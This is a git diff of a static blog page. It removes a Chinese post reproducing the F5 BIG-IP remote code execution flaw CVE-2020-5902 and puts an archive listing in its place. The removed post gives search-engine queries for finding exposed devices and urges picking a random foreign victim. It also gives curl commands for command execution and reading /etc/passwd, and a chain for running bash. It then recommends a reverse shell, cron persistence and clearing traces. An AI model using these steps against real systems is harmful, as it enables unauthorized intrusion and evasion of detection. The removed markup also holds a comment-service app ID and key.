@@ -164,215 +164,33 @@
 </script>
             <div class="main">
                 <div class="container">
-                    <article class="post-wrap">
-                        <header class="post-header">
-                            <h1 class="post-title">
-                                F5 BIG-IP RCE漏洞（CVSS 10）复现
-                            </h1>
+                    <div class="post-wrap archive">
+                        
                             
-                                    <!--zh-->
-                                    <div class="post-meta zh">
-                                        &#x4F5C;&#x8005;:
-                                        <a itemprop="author" rel="author" href="/">
-                                            m0sway
-                                        </a>
-                                        <span class="post-time">&#x65E5;&#x671F;: <a href="#">2020-07-08</a></span>
-                                        <span class="post-readtime">&#x9605;&#x8BFB;&#x65F6;&#x95F4;:<a
-                                    href="#">3.3
-                                    &#x5206;&#x949F;</a></span>
-                                        <span class="post-words">&#x5B57;&#x6570;:<a href="#">749</a></span>
+                                <h3>
+                                    2020
+                                </h3>
+                                
+                                    
+
+                                        <article class="archive-item">
+                                            <a class="archive-item-link" href="https://m0sway.github.io/post/fan-dan-shell-zong-jie/">
+                                                反弹shell总结
+                                            </a>
+                                            <span class="archive-item-date">2020-07-31 </span>
+                                        </article>
                                         
-                                            <span class="post-category">&#x5206;&#x7C7B;:
-                                
-                                <a href="https://m0sway.github.io/tag/Ju9AXFUi2/">F5</a>
-                                
-                                <a href="https://m0sway.github.io/tag/8YXm7_FVZ/">RCE</a>
-                                
-                                <a href="https://m0sway.github.io/tag/kX-lRZXOs/">m0sway</a>
-                                
-                            </span>
-                                            
-                                                阅读量:
-                                                <span data-hk-page="current"> - </span>
-                                                
-                                    </div>
-                                    
-                        </header>
-                        
-                        <div class="post-content">
-                            <p>##简介<br>
-F5 BIG-IP 是美国``F5公司一款集成流量管理、DNS、出入站规则、web应用防火墙、web网关、负载均衡等功能的应用交付平台。<br>
-CVE编号：CVE-2020-5902</p>
-<p>##0x01 漏洞描述<br>
-在 F5 BIG-IP 产品的流量管理用户页面 (TMUI)/配置程序的特定页面中存在一处远程代码执行漏洞。<br>
-导致未授权攻击者可以执行任意命令(弹个shell啥的😋)</p>
-<p>##0x02 影响版本</p>
-<p>BIG-IP 15.x: 15.1.0/15.0.0</p>
-<p>BIG-IP 14.x: 14.1.0 ~ 14.1.2</p>
-<p>BIG-IP 13.x: 13.1.0 ~ 13.1.3</p>
-<p>BIG-IP 12.x: 12.1.0 ~ 12.1.5</p>
-<p>BIG-IP 11.x: 11.6.1 ~ 11.6.5</p>
-<p>##0x03 漏洞验证<br>
-emmmm 首先去shodan上任意寻找一个受害者(别是国内的就行)</p>
-<pre><code>shodan
-http.favicon.hash:-335242539
-http.title:&quot;BIG-IP&amp;reg;- Redirect&quot;
-
-fofa
-title=&quot;BIG-IP&amp;reg;- Redirect&quot;
-
-censys
-443.https.get.body_sha256:5d78eb6fa93b995f9a39f90b6fb32f016e80dbcda8eb&gt;71a17994678692585ee5
-443.https.get.title:&quot;BIG-IP&amp;reg;- Redirect&quot;
-
-google
-inurl:&quot;tmui/login.jsp&quot;
-intitle:&quot;BIG-IP&quot; inurl:&quot;tmui&quot;
-</code></pre>
-<p>####开搞<br>
-(截图随便截的，凑活看看吧)<br>
-github上面已经公布的poc</p>
-<pre><code>RCE: 
-   curl -v -k  'https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb /workspace/tmshCmd.jsp?command=list+auth+user+admin'
-
-Read File: 
-   curl -v -k  'https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd' 
-</code></pre>
-<p>其中<code>list+auth+user+admin</code>这个命令是F5设备的命令，查看管理员权限的用户，如想查看所有用户可以使用<code>list+auth+user</code>来查看(+是连接符，在url中就是空格的含义，不用管它)<br>
-如下图所示：<br>
-<img src="https://m0sway.github.io/post-images/1595831143006.png" alt="" loading="lazy"></p>
-<p>到这里为止，已经验证了，确实能够执行远程命令和远程读取任意文件，但是给出的poc中能执行的只有F5设备的命令，并不能执行例如<code>ls、whoami、pwd</code>等常用的bash命令。<br>
-于是我们需要稍加改造。</p>
-<ul>
-<li>1.修改alias ，将list设置成bash命令</li>
-</ul>
-<pre><code>htts://x.x.x.x/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash
-</code></pre>
-<ul>
-<li>2.生成bash文件并写入要执行的命令</li>
-</ul>
-<pre><code>htts://x.x.x.x/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp
-POST:fileName=/tmp/m0sway&amp;content=whoami
-</code></pre>
-<ul>
-<li>
-<p>3.执行bash文件<br>
-<code>htts://x.x.x.x/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/m0sway</code></p>
-</li>
-<li>
-<p>4.还原alias设置，防止影响目标正常使用（切记一定要还原，不然无法使用正常的命令）<br>
-<code>https://x.x.x.x/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list</code></p>
-</li>
-</ul>
-<p>Example:<br>
-<img src="https://m0sway.github.io/post-images/1595831292953.png" alt="" loading="lazy"></p>
-<p>这是命令成功执行后的回显，此处执行的是whoami命令</p>
-<figure data-type="image" tabindex="1"><img src="https://m0sway.github.io/post-images/1595831311709.png" alt="" loading="lazy"></figure>
-<p>能够执行命令之后，就是弹shell啦。<br>
-这里用python弹，F5设备都是自带python的，使用python弹方便些(用bash弹出来的shell隧道不稳定，容易断开)。<br>
-如果想研究研究F5设备可以在crontab里面弄一条定时任务弹shell.</p>
-<figure data-type="image" tabindex="2"><img src="https://m0sway.github.io/post-images/1595831332726.jpg" alt="" loading="lazy"></figure>
-<p>emmm 记得走之前清理下痕迹就好(我看了下tmp目录，好几个中国的反弹shell的IP，真的是能搞..不过有的应该是弹不出去的shell😇)<br>
-####POC<br>
-我这么懒，是吧？</p>
-
-                        </div>
-                        
-                                
-                                    
-                                            <!--zh-->
-                                            <section class="post-copyright zh">
-                                                <p class="copyright-item ">
-                                                    <span>&#x4F5C;&#x8005;:</span>
-                                                    <span>m0sway</span>
-                                                </p>
-
-                                                <p class="copyright-item">
-                                                    <span>&#x6C38;&#x4E45;&#x94FE;&#x63A5;:</span>
-                                                    <span><a href="https://m0sway.github.io/post/f5-big-ip-rce-lou-dong-cvss-10fu-xian/">https://m0sway.github.io/post/f5-big-ip-rce-lou-dong-cvss-10fu-xian/</a></span>
-                                                </p>
-
-                                                <p class="copyright-item">
-                                                    <span>&#x534F;&#x8BAE;:</span>
-                                                    <span>MIT License</span>
-                                                </p>
-                                            </section>
                                             
                                                 
-                                                    
-                                                                    <!--Share-->
-                                                                    <span style="margin-right:15px">
-                        <i class="post-share"></i>
-                        <span>&#x5206;&#x4EAB;:</span>
-                                                                    <a title="QR 码" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://m0sway.github.io/post/f5-big-ip-rce-lou-dong-cvss-10fu-xian/"><i class="fa fa-qrcode"></i></a>
-                                                                    <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://m0sway.github.io/post/f5-big-ip-rce-lou-dong-cvss-10fu-xian/&sharesource=qzone&title=F5 BIG-IP RCE漏洞（CVSS 10）复现&pics=https://m0sway.github.io/images/avatar.png?v=1596185478867&summary="><i class="fa fa-qq"></i></a>
-                                                                    <a title="新浪微博" target="_blank" href="https://service.weibo.com/share/share.php?url=https://m0sway.github.io/post/f5-big-ip-rce-lou-dong-cvss-10fu-xian/&sharesource=weibo&title=F5 BIG-IP RCE漏洞（CVSS 10）复现 + " - " + &pic="https://m0sway.github.io/images/avatar.png?v=1596185478867 "><i class="fa fa-weibo "></i></a>
-
-                                                                    </span>
-                                                                    
-                                                                            <!--zh-->
-                                                                            <section class="post-tags zh ">
-                                                                                <div>
-                                                                                    <span>&#x6807;&#x7B7E;:</span>
-                                                                                    <span class="tag ">
-                        
-                        
-                        <a href="https://m0sway.github.io/tag/Ju9AXFUi2/">#
-                    F5
-                        </a>
-                        
-                        <a href="https://m0sway.github.io/tag/8YXm7_FVZ/">#
-                    RCE
-                        </a>
-                        
-                        <a href="https://m0sway.github.io/tag/kX-lRZXOs/">#
-                    m0sway
-                        </a>
+                    </div>
+                    <div class="pagination-container">
                         
                             
-                                </span>
-                                                                                </div>
-                                                                                <div>
-                                                                                    <a href="javascript:window.history.back();">
-                        &#x8FD4;&#x56DE;</a>
-                                                                                    <span>&dot;</span>
-                                                                                    <a href="#">&#x4E3B;&#x9875;</a>
-                                                                                </div>
-                                                                            </section>
-
-                                                                            
-                                                                                <!---->
-                                                                                <section class="post-nav">
-                                                                                    
-                                                                                        <a class="prev" rel="prev" href="https://m0sway.github.io/post/xin-xi-shou-ji-zong-jie-pian-bu-ding-qi-geng-xin/">
-                                                                                            信息收集系统篇
-                                                                                        </a>
-                                                                                        
-                                                                                            
-                                                                                </section>
-                    </article>
-                </div>
-                
+                                    
                                             
-                                                <script type="application/javascript" src="//unpkg.com/valine@latest/dist/Valine.min.js"></script>
-<div id="vlaine-comment"></div>
-<script type="application/javascript">
-    new Valine({
-        el: '#vlaine-comment',
-        appId: 'uW9floiITitWlppTUG210Vco-gzGzoHsz',
-        appKey: 'QOQ63bDmWvNAx6F04cpXfCW0',
-        pageSize: 10,
-        avatar: 'mp',
-        placeholder: '嘿嘿嘿！！！',
-        visitor: true,
-        highlight: true,
-        recordIP: true,
-    })
-</script>
-                                                    
+                    </div>
+                </div>
             </div>
-    </div>
-    </div>
     </div>
     
     <div id="player"></div>
@@ -503,8 +321,5 @@ POST:fileName=/tmp/m0sway&amp;content=whoami
                     
         </div>
 </body>
-<script>
-    scroll();
-</script>
 
 </html>
